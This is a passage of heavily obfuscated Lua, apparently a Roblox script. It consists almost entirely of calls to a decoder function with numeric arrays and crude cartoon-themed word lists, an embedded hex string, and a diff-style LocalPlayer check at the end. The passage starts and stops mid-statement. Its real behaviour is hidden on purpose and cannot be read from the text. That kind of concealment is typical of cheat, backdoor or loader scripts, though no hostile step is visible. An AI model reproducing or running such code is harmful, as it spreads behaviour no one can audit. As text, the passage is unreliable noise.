HoleFart HoleWuss DillHeh FartGringo"," BeavisAss BungholeHeh DillFart FartFart DillBunghole"," ButtHeadAss ButtHeadBeavis FartAss BungholeHole DillDammit FartHuh"," DillTp FartFart DillChode BungholeButtHead DillKnocker HoleTurd BeavisCornholio"," HoleFire DillCool HoleDammit FartPlop BungholeFire KnockerHole ButtHeadTurd HoleButtHead"},Buttmunch2)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787809,4,1919787850,1919787789,1,1919787818,5,1919787909,1919787786,2,1919787798,2,1919787837},{" ButtHeadNads CornholioBoing DillCornholio ButtHeadGringo BungholeDill BeavisSucks HoleBeavis"," FartDumb KnockerBeavis BeavisButtHead BeavisWipe ButtHeadDiarrhea HoleWhoa"," BeavisFart BungholeBunghole BeavisBoing BungholeTp CornholioDiarrhea"," DillTp FartFart BungholeHeh HoleButt CornholioButtHead"," CornholioKnocker HoleCrap KnockerMunch BeavisHuh FartButt CornholioSchlong ButtHeadKnocker"},Buttmunch2,not Assmunch2[98223])then Assmunch2[98223]=1;Turd=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787919,1919787925,5,1919787923,6,1919787817,7,1919787964,1919787797,1,1919787795,2,1919787824,8,1919787957,1919787911,9,1919787837,10,1919787952,1919787832,11,1919787782,12,1919787910,2,1919787897,1919787963,9,1919787777,10,1919787908,1919787788,13,1919787786,14,1919787914,2,1919787884,1919787951,9,1919787797,10,1919787928,1919787792,15,1919787806,16,1919787934,2,1919787903,1919787834,2,1919787801,8,1919788012,1919787996,9,1919787874,10,1919788011,1919787873,17,1919787887,18,1919788015,2,1919787793,1919788010,3,1919787982,9,1919787892,10,1919788025,1919787891,19,1919787889,20,1919788029,2,1919788031,2,1919787891},{" CornholioHeh DillDumb CornholioDammit KnockerDill BungholeBunghole"," BungholeNads KnockerWhoa HoleWipe ButtHeadTurd KnockerChode"," DillChode KnockerCool FartKnocker HoleButtHead KnockerBoing"," ButtHeadSucks ButtHeadKnocker BungholeTurd FartScore ButtHeadNads"," KnockerCool DillFire BungholeMunch CornholioWhoa BeavisPlop CornholioNads DillHuh KnockerHole BeavisDammit"," ButtHeadCrap CornholioCornholio HoleBeavis FartNads FartHuh CornholioCrap BungholeHeh"," HoleKnocker KnockerBunghole KnockerWuss CornholioTurd"," BungholeSucks CornholioCool"," HoleCornholio BungholeWhoa KnockerDill BungholeWipe DillHole ButtHeadTurd"," ButtHeadSchlong DillAss CornholioCool DillSucks BeavisCool"," DillWhoa KnockerTp HoleWhoa BeavisTurd BeavisCool BeavisAss DillAss"," BeavisDumb BeavisWhoa CornholioWhoa CornholioAss BeavisDiarrhea DillTurd ButtHeadHeh"," HoleButtHead CornholioDill BeavisAss DillPlop HoleTp HoleKnocker ButtHeadDammit"," BeavisCornholio FartDammit CornholioTp ButtHeadCrap CornholioWhoa DillWipe FartSchlong"," CornholioScore HoleMunch DillDiarrhea DillDammit BeavisPlop ButtHeadBunghole DillBunghole"," ButtHeadHuh KnockerDumb FartAss FartDumb DillGringo CornholioAss CornholioPlop"," ButtHeadWhoa BeavisKnocker DillHeh DillDiarrhea BungholeKnocker HoleNads"," BungholePlop FartPlop DillFart ButtHeadSucks DillBunghole HoleHole"," DillBoing FartSchlong DillSucks CornholioCornholio FartAss BungholeMunch BungholeKnocker"," BeavisNads DillPlop BungholeFart BungholeScore FartCornholio ButtHeadGringo KnockerFire"},Crap1,Diarrhea1)Buttmunch2=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787817,7,1919787858,1919787828,8,1919787826,9,1919787861,1919787792,1,1919787839,10,1919787864,1919787834,11,1919787966,1919787825},{" BungholeDill ButtHeadBoing ButtHeadKnocker DillSucks HoleChode"," KnockerSucks CornholioTp HoleWuss DillBoing ButtHeadWuss"," DillChode KnockerCool HolePlop ButtHeadWhoa CornholioFire"," ButtHeadCornholio FartScore ButtHeadHuh BeavisCrap ButtHeadBeavis"," BeavisBeavis BeavisButt KnockerFire ButtHeadTurd CornholioWipe ButtHeadSchlong HoleChode"," DillSchlong KnockerHeh BungholeTurd DillDill ButtHeadPlop"," KnockerSchlong DillHole FartAss HoleCornholio BeavisSchlong"," ButtHeadMunch BungholeFire HoleCrap BeavisBoing ButtHeadCrap"," DillFire ButtHeadNads KnockerNads ButtHeadDammit HoleFart"," BungholeKnocker DillBoing ButtHeadDumb FartWuss KnockerTurd HoleHeh BungholeHeh"," BungholeTurd DillFire DillTurd DillHole ButtHeadCool ButtHeadKnocker ButtHeadSchlong ButtHeadChode"},Buttmunch2)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787820,5,1919787913,1919787819,6,1919787817,7,1919787924,1919787828,8,1919787826,9,1919787923,1919787792,1,1919787839,10,1919787920,1919787801,2,1919787801,2,1919787790},{" BeavisDammit BeavisButtHead BungholeDill BeavisDill ButtHeadWuss"," HoleTurd DillWhoa KnockerGringo BeavisBoing FartDumb"," FartMunch CornholioWuss FartTurd BeavisHeh BeavisScore FartDiarrhea CornholioPlop"," DillDiarrhea BungholeCornholio BeavisDumb CornholioTp HoleCornholio"," BungholeHeh BungholeDiarrhea HolePlop HoleSchlong CornholioScore"," ButtHeadMunch BungholeFire ButtHeadTp FartAss BeavisScore"," BungholeDill ButtHeadBoing BeavisWhoa DillSucks HoleChode"," ButtHeadScore BeavisHuh CornholioCornholio CornholioBeavis BeavisScore"," BeavisChode CornholioFire HoleBunghole KnockerWipe HoleButt"," KnockerCool FartTurd DillMunch DillCrap BungholeScore KnockerCornholio ButtHeadPlop BeavisMunch"},Buttmunch2,not Assmunch2[113344])then Assmunch2[113344]=1;Hole=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787820,5,1919787913,1919787786,1,1919787784,2,1919787858,1919787797,3,1919787956,1919787835},{" BeavisHuh HoleAss CornholioWipe BungholeCrap BungholeBeavis"," CornholioCrap ButtHeadAss FartDammit BeavisTp ButtHeadWhoa"," FartDumb KnockerGringo CornholioTp CornholioDill BungholeAss ButtHeadButtHead"," BungholeSucks BeavisPlop HoleButtHead DillSucks ButtHeadCornholio"," KnockerNads CornholioButt CornholioGringo CornholioBoing BungholeNads"},Turd,Chode2,Butt1)Buttmunch2=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787791,1,1919787820,4,1919787855,1919787819,5,1919787951,1919787838},{" BungholeBoing BeavisSchlong CornholioSchlong KnockerButtHead BeavisTurd"," CornholioBoing FartButtHead CornholioMunch FartButt HoleDill"," DillCrap BungholeNads CornholioMunch HoleWuss DillHeh FartHole CornholioHole"," DillDill BungholeTp ButtHeadHeh KnockerScore FartCornholio"," BeavisBoing BungholeHuh ButtHeadFart CornholioDammit HoleFire ButtHeadHeh KnockerSucks CornholioTurd"},Buttmunch2)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787852,1919787799,1,1919787828,7,1919787935,1919787792,2,1919787792,2,1919787831},{" BungholeNads KnockerWhoa BungholeDammit HolePlop ButtHeadWhoa"," FartKnocker BeavisChode BungholeBeavis CornholioButtHead BungholeHole"," BeavisHole DillChode BungholeCool FartFart BeavisFire"," FartChode ButtHeadWhoa KnockerCool ButtHeadFart ButtHeadBunghole"," DillButtHead FartSucks CornholioGringo DillGringo DillDill"," FartSchlong DillNads ButtHeadCool CornholioCool ButtHeadPlop"," CornholioSucks HoleWhoa CornholioDiarrhea ButtHeadBoing BeavisGringo BeavisButt DillTp"},Buttmunch2,not Assmunch2[44736])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787820,5,1919787787,1,1919787816,6,1919787931,1919787796,2,1919787796,2,1919787835},{" ButtHeadKnocker DillCrap BeavisHole ButtHeadAss HoleTp"," CornholioChode ButtHeadHole DillButtHead DillSchlong DillBunghole"," DillDumb CornholioWipe CornholioHuh ButtHeadChode BeavisFire DillDiarrhea BungholeTurd"," FartScore KnockerCrap FartDammit HolePlop FartHole"," BeavisCornholio FartButtHead ButtHeadMunch ButtHeadHuh ButtHeadBoing ButtHeadBoing BeavisWipe BeavisKnocker"," ButtHeadDiarrhea ButtHeadDammit BungholeCrap HoleButt FartDill FartMunch KnockerButtHead"},Buttmunch2,not Assmunch2[19338])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787822,4,1919787820,5,1919787855,1919787819,6,1919787817,7,1919787924,1919787797,1,1919787826,8,1919787933,1919787794,2,1919787806,2,1919787829},{" KnockerHuh HoleHeh FartCool BungholeBoing FartHeh KnockerSucks HoleSchlong"," FartPlop CornholioDiarrhea ButtHeadTurd CornholioWipe BungholeButt"," KnockerHeh KnockerDammit BungholePlop BungholeHole CornholioWhoa"," ButtHeadScore BeavisHuh CornholioSucks CornholioBeavis KnockerWhoa"," FartChode ButtHeadWhoa CornholioDiarrhea HoleBunghole KnockerWipe"," ButtHeadCrap BeavisMunch ButtHeadBeavis BeavisWipe"," ButtHeadFart HoleTurd BeavisKnocker KnockerSucks"," CornholioChode ButtHeadHole ButtHeadBoing HoleGringo BeavisButt KnockerDammit KnockerScore"},Buttmunch2,not Assmunch2[39240])then Assmunch2[39240]=1;FireFire1=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787914,1919787830,7,1919787828,8,1919787863,1919787915,9,1919787825,10,1919787956,1919787836,11,1919787834,12,1919787962,2,1919787790},{" FartFart HoleSchlong BungholeAss ButtHeadFart KnockerWipe"," FartBoing BeavisHole BungholeFire BungholeFart ButtHeadCool"," DillWhoa KnockerTp CornholioWipe BungholeHuh BungholeBeavis"," FartWuss ButtHeadTp DillChode BungholeSucks KnockerHole"," DillNads BungholeDammit BeavisFire KnockerCrap BungholeTurd"," BungholeWipe BeavisCool CornholioNads BungholeFire DillHole"," KnockerWipe KnockerWuss BeavisDammit HoleWhoa CornholioScore"," FartButtHead ButtHeadPlop BungholeDumb ButtHeadDill KnockerDill"," CornholioTurd FartFire HoleSucks DillCornholio BeavisFart BeavisCrap"," HoleHeh HoleWipe FartBoing CornholioTurd BungholeHeh"," KnockerWipe KnockerWuss BeavisBeavis HoleButtHead ButtHeadSchlong BungholeBeavis BeavisDill"," BungholeMunch BungholeButtHead ButtHeadDill BeavisButt DillTp BungholeScore FartCornholio"})break elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787786,1,1919787817,6,1919787930,1919787799,2,1919787795,2,1919787832},{" BeavisButt FartBeavis HoleDammit ButtHeadPlop ButtHeadChode"," DillCrap KnockerGringo BeavisDiarrhea BungholeDill DillHeh"," DillButt BeavisBeavis KnockerCrap CornholioDiarrhea HoleBoing"," BeavisGringo KnockerChode BungholeTurd CornholioTurd BungholeWuss"," FartWhoa FartAss FartBunghole FartBoing FartScore HoleHuh BeavisKnocker"," HoleDammit FartNads DillKnocker HoleDill FartWipe ButtHeadButt CornholioSucks BeavisBoing"},Buttmunch2,not Assmunch2[114113])then Assmunch2[114113]=1;AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787926,4,1919787820,5,1919787937,1919787786,1,1919787817,6,1919787964,1919787916,7,1919787826,8,1919787963,1919787792,2,1919787965,1,1919787967,2,1919787827},{" ButtHeadHeh BungholeBoing ButtHeadNads KnockerHole HolePlop DillPlop DillNads"," BeavisCrap BeavisTp BungholeHole BeavisBunghole CornholioCrap"," KnockerDill DillFart CornholioTurd DillChode BungholeDill"," KnockerFire KnockerCornholio DillFart FartFart DillFire CornholioHeh"," KnockerBeavis DillBeavis DillFart KnockerBeavis DillMunch CornholioHeh BeavisSchlong"," CornholioDill DillSchlong"," BeavisButtHead FartWhoa FartChode ButtHeadDumb KnockerDammit HoleMunch CornholioWipe"," DillChode FartKnocker FartCornholio CornholioHuh BungholeDill"},Diarrhea1,Hole)Buttmunch2=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787919,1919787788,1,1919787819,5,1919787852,1919787830,6,1919787954,1919787837},{" BungholeChode FartBunghole BeavisTp CornholioTurd ButtHeadHole"," BungholeSucks BeavisPlop BungholeSchlong BungholeCrap BungholeBeavis"," FartButt ButtHeadDill CornholioScore BeavisCool BungholePlop"," DillFart KnockerScore CornholioHeh BeavisSchlong ButtHeadBoing"," DillSchlong KnockerHeh FartBoing BungholeNads BungholeWuss BungholeSucks FartButt"," BeavisTp ButtHeadDumb DillDumb FartCrap ButtHeadWuss HoleTp FartWhoa FartFart"},Buttmunch2)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787852,1919787799,1,1919787828,7,1919787935,1919787792,2,1919787792,2,1919787831},{" BeavisBeavis HoleFart DillDumb BeavisDill FartGringo"," BeavisBeavis HoleFart KnockerFire FartTurd ButtHeadMunch"," FartButtHead ButtHeadPlop HoleAss HoleGringo DillMunch"," ButtHeadWuss BeavisButt CornholioCornholio DillFire ButtHeadCrap"," CornholioChode ButtHeadHole DillButtHead FartSchlong HoleHuh"," KnockerTp CornholioSchlong BeavisScore CornholioBoing HoleHeh"," FartCool FartWipe BeavisSchlong DillDill CornholioPlop DillWhoa DillScore"},Buttmunch2,not Assmunch2[92874])then end end elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787817,7,1919787924,1919787797,1,1919787914,8,1919787824,9,1919787957,1919787839,10,1919787837,11,1919787961,2,1919787924,1919787790},{" CornholioDumb KnockerCrap KnockerHole CornholioButt KnockerChode"," KnockerKnocker CornholioBoing FartMunch KnockerButtHead FartBeavis"," FartScore BungholeHole DillTp DillWuss BeavisWhoa"," FartTurd BungholeChode BeavisTurd BeavisSucks CornholioChode"," CornholioButt BungholeFire HoleBeavis BeavisBeavis KnockerButtHead DillBeavis ButtHeadWipe"," ButtHeadGringo FartBoing HoleDill DillNads"," FartDumb ButtHeadCornholio BeavisGringo HoleHuh"," HoleSchlong FartCrap ButtHeadWuss CornholioWipe DillBeavis KnockerTp"," CornholioHeh FartSchlong FartButtHead BungholeWipe FartBoing"," ButtHeadSchlong CornholioFart DillDiarrhea ButtHeadHuh DillFart ButtHeadDammit BungholeGringo"," CornholioFart CornholioBeavis BungholeCornholio KnockerDumb BeavisBeavis ButtHeadKnocker CornholioScore"},FireFire1)then local Wuss2=47851;local Sucks2={}local Cool2=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787926,4,1919787820,5,1919787937,1919787945,0,1919787809},{" DillHole ButtHeadSchlong ButtHeadGringo KnockerAss ButtHeadAss KnockerHeh FartWhoa"," FartGringo HoleHuh ButtHeadTp FartAss CornholioHeh"," KnockerCool FartTurd BeavisChode BungholeFart BungholeScore"," KnockerBeavis KnockerButtHead CornholioFire"," ButtHeadDiarrhea ButtHeadGringo BungholeSucks BungholeDammit DillPlop CornholioHole"})while true do if AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787928,3,1919787789,16,1919787924,4,1919787818,5,1919787939,1919787947,0,1919787798,1,1919787854,1919787826,6,1919787921,1919787825,7,1919787922,1919787828},{" KnockerChode ButtHeadDiarrhea CornholioChode FartDumb BungholeKnocker"," CornholioHeh DillDumb FartSchlong BeavisHuh ButtHeadDiarrhea"," BeavisCrap FartSucks CornholioWhoa BeavisCrap HoleGringo"," HoleWhoa FartDammit ButtHeadCool"," HoleButtHead BeavisHole ButtHeadWuss CornholioHole HoleNads FartFart"," CornholioTurd FartDumb FartTurd HoleTurd KnockerButtHead",false},Cool2)then AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787822,4,1919787820,5,1919787855,1919787819,6,1919787817,7,1919787858,1919787828,8,1919787914,9,1919787824,10,1919787957,1919787965,0,1919787829},{" BungholeButt BeavisHole DillAss KnockerTp KnockerFire BeavisButtHead BungholeWipe"," ButtHeadNads BungholeAss KnockerScore ButtHeadWhoa DillCool"," KnockerChode ButtHeadDiarrhea BeavisAss BungholeHole BungholeDiarrhea"," ButtHeadDill KnockerButtHead KnockerSucks CornholioDumb BungholeHeh"," HoleWuss HoleBoing HoleButtHead DillSucks HoleChode"," HoleWipe ButtHeadWipe BungholeCrap DillDumb CornholioBeavis"," KnockerTurd BeavisBoing BungholeDill KnockerDumb CornholioButt"," FartChode BungholeTp ButtHeadFart HoleChode BeavisChode DillTurd KnockerScore"," ButtHeadSucks FartBunghole HoleHeh ButtHeadSucks BeavisButt"," CornholioFire FartKnocker BungholeDiarrhea KnockerNads ButtHeadTp"})Cool2=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787929,4,1919787823,5,1919787942,1919787944,0,1919787808},{" FartAss FartWhoa FartSchlong BeavisButtHead BungholeFire ButtHeadDiarrhea"," HoleDiarrhea DillSucks FartChode HoleFire BungholeFire BeavisDammit DillDill"," CornholioHeh CornholioBunghole BeavisChode BeavisKnocker DillGringo CornholioCrap KnockerWipe"," HoleSchlong DillHole BeavisBeavis"," BeavisWipe HoleDammit BungholeChode HoleDumb DillBoing HoleSucks"})end;if AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787822,4,1919787820,5,1919787855,1919787819,6,1919787817,7,1919787858,1919787828,8,1919787826,9,1919787861,1919787792,1,1919787839,10,1919787920,1919787801,2,1919787801,2,1919787790},{" BungholeBunghole BungholeWuss KnockerDill CornholioDill BeavisDammit HoleButtHead"," ButtHeadWipe BeavisFart BungholeTurd CornholioAss KnockerButt"," BeavisBoing BungholeHuh HoleNads DillSchlong BeavisButt"," CornholioScore HoleMunch KnockerFart DillBeavis KnockerTp"," ButtHeadBoing ButtHeadMunch CornholioGringo DillWuss KnockerCornholio"," FartDumb ButtHeadCornholio KnockerMunch BeavisWipe HoleHole"," FartTurd BungholeChode CornholioScore HoleCrap BeavisBoing"," CornholioAss KnockerBunghole DillHole BeavisTp ButtHeadKnocker"," KnockerDumb ButtHeadSucks BungholeHuh DillHuh BeavisHole"," ButtHeadSucks ButtHeadKnocker CornholioFart BungholeNads BungholeHeh CornholioMunch FartFire ButtHeadTurd"},Wuss2,not Sucks2[101726])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787809,4,1919787916,1919787820,5,1919787787,1,1919787816,6,1919787931,1919787796,2,1919787796,2,1919787835},{" BungholeHole DillDumb CornholioBeavis KnockerCrap CornholioDill KnockerPlop CornholioAss"," DillDumb HoleTurd BungholeBoing KnockerFire FartCool BungholeTp"," CornholioKnocker HoleCrap DillChode BungholeCornholio ButtHeadHeh"," HoleTurd DillWhoa FartChode HoleDiarrhea HoleCornholio"," KnockerFire BungholeNads KnockerButtHead BeavisCrap HoleChode HoleTurd DillDammit"," KnockerCool FartTurd BeavisChode CornholioKnocker CornholioBoing DillCornholio BungholeHuh"},Wuss2,not Sucks2[47851])then Sucks2[47851]=1;Diarrhea1.k=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787822,4,1919787820,5,1919787913,1919787786,1,1919787817,6,1919787964,1919787916,7,1919787826,8,1919787963,1919787825,9,1919787839,10,1919787967,2,1919787870,1919787824},{" BeavisNads KnockerHuh HoleTp CornholioAss BungholeWuss BungholeCornholio"," HoleHole CornholioSucks BungholeBoing FartHeh FartFire"," ButtHeadDiarrhea ButtHeadDammit ButtHeadGringo BeavisMunch HoleCool"," FartPlop CornholioDiarrhea HolePlop ButtHeadWhoa DillCool"," ButtHeadBunghole BeavisCornholio HoleMunch HoleDammit KnockerButt"," KnockerTurd BeavisButt"," CornholioTurd FartFire HoleSucks DillCornholio BeavisFart BeavisCrap"," FartDammit BungholeCrap KnockerHuh HoleWipe HoleSucks"," BeavisCool BungholeNads HoleTp KnockerNads FartCool BeavisWipe"," FartFire CornholioDammit DillCool HoleCrap FartButtHead CornholioHeh"},Diarrhea1)Wuss2=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787820,5,1919787855,1919787819,6,1919787817,7,1919787858,1919787797,1,1919787826,8,1919787861,1919787825,9,1919787961,1919787828},{" BeavisWuss BeavisAss KnockerHuh DillTp HoleSucks"," BungholeChode FartBunghole KnockerTurd DillCornholio ButtHeadHole"," BungholeDammit HoleWhoa CornholioMunch HoleCool ButtHeadAss HoleTurd CornholioHuh"," BeavisHuh HoleAss KnockerCornholio ButtHeadGringo BungholeBeavis"," FartChode ButtHeadWhoa BungholeDiarrhea HoleBoing BungholeChode"," BungholeTp HoleWuss FartCool DillBunghole HoleCornholio"," CornholioKnocker HoleCrap BungholeChode BeavisHuh HoleWipe"," FartDammit FartCool KnockerBoing ButtHeadChode BeavisHole KnockerFart BungholeKnocker"," BungholeMunch BungholeButtHead FartSchlong KnockerDill ButtHeadDiarrhea HoleMunch HoleWhoa ButtHeadGringo"},Wuss2)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787791,1,1919787820,4,1919787911,1919787784,2,1919787784,2,1919787839},{" FartGringo HoleHuh KnockerBeavis CornholioChode KnockerWhoa"," FartCool FartWipe BungholeTurd CornholioAss BungholeWhoa"," CornholioHeh CornholioCornholio DillBunghole HoleDumb HoleHole HoleHeh KnockerMunch"," KnockerHole KnockerMunch CornholioScore KnockerGringo BeavisFire FartNads FartBoing"},Wuss2,not Sucks2[70061])then Sucks2[70061]=1;FireFire1=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787928,3,1919787822,4,1919787943,1919787821,5,1919787819,6,1919787947,2,1919787839},{" ButtHeadTp CornholioCool KnockerDiarrhea HoleKnocker FartSchlong"," HoleChode CornholioDumb BungholeKnocker BeavisPlop ButtHeadBunghole"," BungholeCrap HoleTurd CornholioHole ButtHeadHole FartBeavis ButtHeadBeavis"," HoleScore FartHeh ButtHeadFire KnockerSucks DillCornholio"," BeavisCrap BeavisTp CornholioHeh BeavisSchlong ButtHeadFart KnockerMunch"," KnockerTurd BeavisBoing HoleButt DillHole FartGringo BeavisWhoa"})break elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787791,1,1919787820,4,1919787911,1919787784,2,1919787784,2,1919787839},{" KnockerSchlong DillHole BeavisBoing KnockerCrap"," KnockerCrap ButtHeadChode BeavisGringo BeavisHuh ButtHeadHeh"," DillButtHead BeavisHeh HoleCornholio KnockerTp BungholeBoing BungholeWuss"," FartPlop CornholioDiarrhea CornholioSchlong CornholioHole ButtHeadButt BungholeBeavis HoleBeavis KnockerFart"},Wuss2,not Sucks2[110869])then end end end;break end end end;Knocker1=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787817,7,1919787924,1919787828,8,1919787795,1,1919787824,9,1919787867,1919787839,10,1919787963,1919787826},{" BungholeBunghole BeavisDumb FartPlop DillDumb DillHeh"," BungholeWuss KnockerDiarrhea ButtHeadCool ButtHeadWhoa DillCool"," DillCornholio BungholeMunch FartButt CornholioButt CornholioHole"," DillBeavis DillScore BeavisHeh HoleCornholio FartHuh"," KnockerChode CornholioChode CornholioTp BungholeAss CornholioFire DillSchlong"," CornholioCool BeavisScore FartButt FartGringo CornholioHole"," DillMunch BeavisCrap CornholioAss ButtHeadNads BungholeSucks"," ButtHeadFart HoleFart KnockerDammit KnockerSucks DillCornholio BungholeBoing CornholioWuss"," BungholeCool BeavisDammit FartDumb BeavisSchlong KnockerPlop ButtHeadDill"," DillSucks BungholeScore BungholeTp KnockerDiarrhea BeavisPlop CornholioDammit KnockerHuh CornholioDill"},Knocker1)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787777,1,1919787822,3,1919787905,1919787790,2,1919787786,2,1919787809},{" DillTurd DillButtHead HoleButtHead KnockerKnocker"," ButtHeadAss FartHeh FartCool HoleDiarrhea"," CornholioFart CornholioBeavis DillTurd FartFire HoleSucks BeavisFart ButtHeadSchlong"},Knocker1,not Munch1[40709])then Munch1[40709]=1;Hole1=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787820,5,1919787913,1919787819,6,1919787921,7,1919787831,8,1919787966,1919787826,9,1919787824,10,1919787964,2,1919787908,7,1919787834,8,1919787955,1919787833,11,1919787783,12,1919787911,2,1919787878,1919787784},{" ButtHeadSucks ButtHeadKnocker FartHuh DillWipe ButtHeadNads"," BeavisCrap BeavisTp KnockerBunghole BungholeAss HoleKnocker"," KnockerHeh KnockerAss BungholeTp CornholioDiarrhea BungholeDiarrhea CornholioBunghole BeavisHeh"," ButtHeadGringo FartBoing ButtHeadMunch CornholioHole FartBeavis"," BeavisSchlong FartDill BeavisButt HoleHole BeavisTp"," BeavisScore BeavisNads DillBunghole DillCrap ButtHeadDiarrhea ButtHeadFart FartCornholio"," FartDiarrhea BungholeBunghole KnockerTurd HoleBoing FartCornholio KnockerKnocker"," CornholioChode ButtHeadBoing BeavisSucks HoleDiarrhea CornholioHeh"," ButtHeadButtHead BeavisFire FartHeh FartButt HoleTurd KnockerSchlong ButtHeadButt CornholioBunghole"," FartSchlong DillNads KnockerSucks KnockerCornholio ButtHeadGringo CornholioWuss BeavisHole"," DillAss BungholeSucks ButtHeadDammit HoleFart BungholeWipe DillGringo DillWipe FartPlop FartHeh DillScore ButtHeadWuss KnockerHeh"," HoleWhoa BungholeWipe FartTurd FartGringo KnockerSchlong ButtHeadButt ButtHeadSucks"})Knocker1=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787849,1919787788,1,1919787819,5,1919787852,1919787830,6,1919787954,1919787837},{" FartCrap BeavisDiarrhea DillFart KnockerBeavis BungholeGringo"," KnockerTp CornholioSchlong HoleCornholio BeavisBunghole BungholeNads"," CornholioDammit ButtHeadHuh KnockerSucks CornholioDumb ButtHeadNads"," DillNads BungholeDammit CornholioBeavis"," BungholeCool BeavisDammit FartNads BungholeAss ButtHeadBoing ButtHeadDill HoleHuh"," FartBunghole HoleWipe ButtHeadDumb HoleCornholio BungholeTurd HoleDammit DillChode CornholioMunch"},Knocker1)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787914,1919787830,7,1919787797,1,1919787826,8,1919787933,1919787794,2,1919787806,2,1919787829},{" KnockerButt BeavisBunghole HoleDill BeavisCornholio DillSucks"," BeavisFart BungholeBunghole FartButtHead BungholeMunch BeavisBunghole"," BeavisNads DillPlop DillCrap ButtHeadCool DillCornholio"," BeavisTp ButtHeadDumb KnockerFire FartCrap ButtHeadWuss"," ButtHeadSucks ButtHeadKnocker BeavisWuss CornholioAss BungholeWhoa"," HoleCrap KnockerCornholio HoleTp DillButtHead FartCool"," KnockerBeavis HoleSchlong DillDammit BeavisNads BungholeChode DillTp DillGringo"," BeavisMunch FartDiarrhea KnockerButtHead CornholioFire ButtHeadTp BeavisHeh BungholeMunch"},Knocker1,not Munch1[15606])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787784,1,1919787831,7,1919787928,1919787793,2,1919787793,2,1919787830},{" CornholioPlop DillBeavis DillWuss HoleSchlong"," CornholioScore HoleMunch ButtHeadAss KnockerSchlong BungholeDumb"," HoleHuh BungholeDumb HoleWhoa KnockerButt BeavisMunch"," CornholioDill KnockerBeavis BungholeHeh BungholeSucks DillHole"," KnockerTp KnockerCrap KnockerButtHead CornholioCrap DillSchlong BungholeBoing KnockerDammit"," ButtHeadDammit KnockerCool BeavisPlop ButtHeadSucks BeavisChode CornholioDill CornholioFart"," BungholeMunch BungholeButtHead ButtHeadSucks BeavisButt FartWuss HoleMunch CornholioTurd"},Knocker1,not Munch1[91988])then Munch1[91988]=1;Crap1="317064cb0a13609d9c0741e8218f1cc4f9e609e07ecf2db7ba85ed4394a5032ac37d65dd7a22e4726a9a2383eb26342902c004286baa50d68d1fec837ca467c2ec0d5bc308748b864870e769a5b0a2e9b6f15fbe3b153b3a7402f397fab1"Knocker1=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787822,4,1919787820,5,1919787818,6,1919787853,1919787817,7,1919787831,8,1919787926,1919787795,1,1919787824,9,1919787867,1919787839,10,1919787963,1919787826},{" BungholeBoing BungholeTurd HoleDill KnockerChode DillTurd FartButt CornholioHeh"," BungholeMunch BungholeButtHead ButtHeadBunghole HoleDumb DillTp"," BeavisHole DillChode BungholeCool ButtHeadDammit HoleFire"," DillAss KnockerBeavis HoleDiarrhea DillAss CornholioKnocker"," KnockerFire HoleBunghole FartWipe FartWhoa ButtHeadDammit"," ButtHeadHole BeavisWuss DillPlop CornholioHole DillButt"," CornholioDumb KnockerCrap KnockerHole CornholioButt KnockerChode"," FartCool FartWipe BungholeTurd FartDiarrhea KnockerWipe"," CornholioFart CornholioBeavis DillWhoa FartDammit HolePlop HoleButtHead CornholioHuh"," CornholioWipe CornholioGringo BeavisDill DillAss FartBunghole HoleNads ButtHeadSucks BeavisButtHead"},Knocker1)end end end,not not 1)break elseif AlmightyBunghole({1919787815,1,1919787780,1,1919787811,2,1919787916,1919787789,2,1919787789,2,1919787810},{" BungholeBeavis FartBunghole KnockerNads ButtHeadBeavis ButtHeadWipe HoleFart"," KnockerBeavis FartHole CornholioDiarrhea KnockerTp HoleGringo HoleHuh ButtHeadDiarrhea"},HuhHuh1,not HehHeh1[39912])then end end
+if not LocalPlayer then
+    return
+end
+
